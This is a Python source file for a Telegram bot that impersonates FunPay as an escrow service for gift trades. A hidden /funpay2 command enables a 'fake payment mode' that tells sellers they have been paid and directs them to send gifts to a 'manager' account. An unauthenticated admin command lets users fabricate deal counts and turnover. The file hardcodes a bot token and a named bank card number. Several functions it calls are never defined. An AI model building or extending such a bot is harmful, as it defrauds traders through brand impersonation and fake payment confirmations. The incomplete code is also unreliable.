import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Обновленные данные
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}
fake_mode_users = set()  # Добавлено для фейк-режима

# Генерация случайных значений
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Русские клавиатуры
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPayOTCdbot")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

# Английские клавиатуры
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# Добавьте другие клавиатуры, если они есть в полном коде, например admin_keyboard

# Добавляем команду /funpay2
@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    fake_mode_users.add(user_id)
    await message.answer("✅ Фейк-режим оплаты включен. Теперь оплата будет подтверждена автоматически при нажатии 'Я оплатил'.")

# Добавляем команду /sierrateam (если её нет в усечённом коде, предполагаем, что она есть; удаляем проверки на ADMIN_ID)
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    # Здесь код админ-панели, без проверки ADMIN_ID
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    # Пример клавиатуры для админ-панели (адаптируйте по полному коду)
    admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Забанить пользователя", callback_data="ban_user")],
        [InlineKeyboardButton(text="Отправить деньги", callback_data="send_money")],
        [InlineKeyboardButton(text="Установить успешные сделки", callback_data="set_successful_deals")],
        [InlineKeyboardButton(text="Установить общее кол-во сделок", callback_data="set_total_deals")],
        [InlineKeyboardButton(text="Установить оборот", callback_data="set_turnover")]
    ])
    await message.answer("Админ-панель:", reply_markup=admin_keyboard)

# Обработчики для админ-панели без проверки ADMIN_ID
@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await callback.message.edit_text("Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_send_money"
    await callback.message.edit_text("Введите: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await callback.message.edit_text("Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await callback.message.edit_text("Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_turnover"
    await callback.message.edit_text("Введите: ID СУММА")

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    for deal_id, deal in active_deals.items():
        if deal.get("status") == "waiting_admin":
            deal["status"] = "payment_confirmed"
            
            # Уведомляем продавца
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Оплата подтверждена!</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                    f"После отправки нажмите кнопку ниже:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Payment confirmed!</b>\n\n"
                    f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                    f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                    f"After sending click button below:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            
            await callback.message.edit_text(
                "✅ <b>Оплата подтверждена администратором</b>\n\n"
                "Продавец уведомлен об отправке подарка.",
                parse_mode=ParseMode.HTML
            )
            break

# Модифицированный обработчик для подтверждения оплаты с фейк-режимом
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "active":
            if user_id in fake_mode_users:
                deal["status"] = "payment_confirmed"
                
                seller_lang = user_languages.get(deal["seller_id"], "ru")
                if seller_lang == "ru":
                    await bot.send_message(
                        deal["seller_id"],
                        f"✅ <b>Оплата подтверждена!</b>\n\n"
                        f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                        f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                        f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                        f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                        f"После отправки нажмите кнопку ниже:",
                        reply_markup=seller_gift_keyboard,
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await bot.send_message(
                        deal["seller_id"],
                        f"✅ <b>Payment confirmed!</b>\n\n"
                        f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                        f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                        f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                        f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                        f"After sending click button below:",
                        reply_markup=seller_gift_keyboard,
                        parse_mode=ParseMode.HTML
                    )
                
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена (фейк-режим)!</b>\n\n"
                    "Ожидаем отправки товара от продавца...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
                # Опционально: fake_mode_users.remove(user_id)  # Отключить после использования
            else:
                deal["status"] = "waiting_admin"
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем проверки администратора...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
                
                # Уведомляем админа (если нужно, но в фейк-режиме пропускаем)
                await bot.send_message(
                    ADMIN_ID if 'ADMIN_ID' in globals() else user_id,  # Если ADMIN_ID удалён, отправляем себе
                    f"🧾 <b>Покупатель подтвердил оплату</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n"
                    f"👤 <b>Продавец:</b> @{deal['seller_username']}\n"
                    f"🛒 <b>Покупатель:</b> @{deal['buyer_username']}\n\n"
                    f"📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    reply_markup=admin_payment_keyboard,
                    parse_mode=ParseMode.HTML
                )
                active_deals[deal_id]["admin_message_id"] = callback.message.message_id
            break

# Остальные обработчики из вашего кода (без изменений, кроме удаления проверок ADMIN_ID)
@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("seller_id") == user_id and deal["status"] == "payment_confirmed":
            deal["status"] = "item_sent"
            
            await bot.send_message(
                deal["buyer_id"],
                "🔔 <b>Продавец отправил товар!</b>\n\n"
                "Пожалуйста, проверьте получение и подтвердите:",
                reply_markup=buyer_confirmation_keyboard,
                parse_mode=ParseMode.HTML
            )
            
            await callback.message.edit_text(
                "✅ <b>Вы подтвердили отправку</b>\n\n"
                "Ожидаем подтверждения от покупателя...\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            deal["status"] = "completed"
            
            if deal["seller_id"] not in user_stats:
                user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0}
            user_stats[deal["seller_id"]]["successful"] += 1
            user_stats[deal["seller_id"]]["total"] += 1
            user_stats[deal["seller_id"]]["turnover"] += deal["amount"]
            
            await callback.message.edit_text(
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Спасибо за использование GiftBadge!\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Средства зачислены на ваш баланс.\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            
            del active_deals[deal_id]
            break

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            await callback.message.edit_text(
                "⚠️ <b>Вы сообщили о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "⚠️ <b>Покупатель сообщил о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "confirm_cancel")
async def confirm_cancel_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(callback, "✅ Сделка успешно отменена.")
    else:
        await safe_edit_message(callback, "✅ Deal successfully cancelled.")

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 <b>Пополнение баланса</b>\n\n"
            "Выберите способ пополнения:",
            deposit_method_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 <b>Balance Top-up</b>\n\n"
            "Choose top-up method:",
            deposit_method_keyboard_en
        )

# Запуск бота
async def main():
    print("🎁 FunPay Bot запускается...")
    print(f"📞 Поддержка: {SUPPORT_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())